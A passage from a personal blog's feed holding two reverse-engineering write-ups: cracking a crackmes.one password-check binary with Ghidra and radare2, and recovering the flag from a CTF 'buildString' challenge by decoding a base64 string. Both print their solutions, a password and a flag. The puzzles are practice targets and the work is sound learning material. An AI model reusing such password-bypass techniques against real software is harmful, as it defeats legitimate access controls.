          Defeating ASLR via Memory Leak
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
          Mining Hero Vulnerabilities
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">Today, I will be showing how I created a basic debugger in C for Linux programs. This won’t be a very complicated debugger as it will only allow you to do three things: see the values of the registers, step through one instruction, and read hex values from memory. Obviously, this is nothing compared to something like IDA Pro, but making a basic debugger did help me understand what the debugger is actually doing when we are using it.</summary></entry><entry><title type="html">Cracking Silva97’s login-cipher</title><link href="http://localhost:4000/2020/02/27/cracking-Silva97-login-cipher.html" rel="alternate" type="text/html" title="Cracking Silva97's login-cipher" /><published>2020-02-27T00:00:00-05:00</published><updated>2020-02-27T00:00:00-05:00</updated><id>http://localhost:4000/2020/02/27/cracking-Silva97-login-cipher</id><content type="html" xml:base="http://localhost:4000/2020/02/27/cracking-Silva97-login-cipher.html">&lt;p&gt;Today, I am going to show you how I reverse engineered &lt;a href=&quot;https://crackmes.one/crackme/5db0ef9f33c5d46f00e2c729&quot;&gt;this binary&lt;/a&gt; and cracked the password.  First, when we run the program, we can see that the program is asking us to input a password. If we input the incorrect password, the program says, “Wrong!”&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-27-cracking-Silva97-login-cipher/output.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is what the main function looks like in Ghidra. Note that I renamed some variables/functions so that the code can be easier to read.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-27-cracking-Silva97-login-cipher/main.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There’s some interesting stuff happening here. First of all, the print() function will take an encrypted string, decrypt it, and print it out. The encryption appears to be some sort of modified caesar cipher, but I’m not going to go too in depth into this function because it does not matter. The important thing to note is that the line that says&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;uVar1 = check_input(input,&quot;fhz4yhx|~g=5&quot;);&quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;will check whether the given input is correct or not. If the input is correct, the check_input() function will return 0, else, it will return 1 (this can be figured out by stepping over the function in a debugger using an input value that we know is incorrect). Clearly, our goal here is to figure out what input value makes the check_input() function return 0.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-27-cracking-Silva97-login-cipher/check_input.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The second parameter to the check_input() function contains the correct input, but in an encrypted form. The gen_character() function will decrypt the input and return a single character, and successive calls to gen_character() using 0 as the input will return the next decrypted character. The while loop in the middle of the code will check whether each input character is equal to the decrypted character that gen_character() returned. Since we now know where the correct input is being decrypted in the code, all we have to do is set a breakpoint right after the gen_character() function is executed and look at it’s return value.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-27-cracking-Silva97-login-cipher/first_value.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I used radare2 to step over the first call to the gen_character() function. The decrypted character is 0x63, which is returned in rax. Next, I set rip equal to the second call to the gen_character() function using “dr rip = 0x55f90fc16409”, and I stepped over that line of code to figure out what the next decrypted character is. This also ended being 0x63.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-27-cracking-Silva97-login-cipher/next_value.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I once again set rip to the gen_character() function and stepped over that line of code to figure out the next decrypted character, and I repeated these steps until I figured out what all of the decrypted characters were, which are shown below:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x63, 0x63, 0x73, 0x2d, 0x70, 0x61, 0x73, 0x73, 0x77, 0x64, 0x34, 0x34, 0x00
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I assumed 0x00 indicated that this was the end of the string and stopped after seeing it. I sent over these values to the program using python, and I was able to crack the puzzle.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c &quot;print('\x63\x63\x73\x2d\x70\x61\x73\x73\x77\x64\x34\x34')&quot; | ./login
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-27-cracking-Silva97-login-cipher/cracked.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
          Creating a Basic Heap Allocator
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
          Defeating ASLR via Memory Leak
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
          Mining Hero Vulnerabilities
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">Today, I am going to show you how I reverse engineered this binary and cracked the password. First, when we run the program, we can see that the program is asking us to input a password. If we input the incorrect password, the program says, “Wrong!”</summary></entry><entry><title type="html">Reversing the buildString CTF challenge</title><link href="http://localhost:4000/2020/02/22/reversing-buildString-program.html" rel="alternate" type="text/html" title="Reversing the buildString CTF challenge" /><published>2020-02-22T00:00:00-05:00</published><updated>2020-02-22T00:00:00-05:00</updated><id>http://localhost:4000/2020/02/22/reversing-buildString-program</id><content type="html" xml:base="http://localhost:4000/2020/02/22/reversing-buildString-program.html">&lt;p&gt;Earlier today, I had gone to VMI’s 2020 Cyberfusion CTF with my college’s CTF team (we won first place!), and I’m going to show how I solved one of their reverse engineering challenges. I was given a binary file called &lt;a href=&quot;../../../assets/other/2020-2-22-reversing-buildString-program/buildString&quot;&gt;buildString&lt;/a&gt;, and upon executing the file, I was greeted with the following output.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-22-reversing-buildString-program/output.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I used r2ghidra to decompile the main function, and it is clear that there is a lot going on here.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-22-reversing-buildString-program/main.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Essentially, the program is trying to generate a string using a strange algorithm that obfuscates what the string is. It took longer then I want to admit to figure out what I was supposed to do, but I eventually found out that the most important part to reversing this binary lies in the end of the main function, where another function called finalAssembly() is being called.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-22-reversing-buildString-program/main_end.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I set a breakpoint at this function and took a look around. There are two function calls at the very beginning that are, presumably, being used to generate the string. I stepped over the two function calls and printed out the value of rdi, which happened to be “ZmxhZ3tFQHp5X1AzM3p5X2xlbW9uc3EzM3p5fQ==”.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-22-reversing-buildString-program/finalAssembly.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After base64 decoding this value, I obtained the flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;../../../assets/img/2020-2-22-reversing-buildString-program/flag.png&quot; style=&quot;margin-left: auto; margin-right: auto;&quot; /&gt;&lt;/p&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
          Creating a Basic Heap Allocator
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
          Defeating ASLR via Memory Leak
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
          Mining Hero Vulnerabilities
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">Earlier today, I had gone to VMI’s 2020 Cyberfusion CTF with my college’s CTF team (we won first place!), and I’m going to show how I solved one of their reverse engineering challenges. I was given a binary file called buildString, and upon executing the file, I was greeted with the following output.</summary></entry></feed>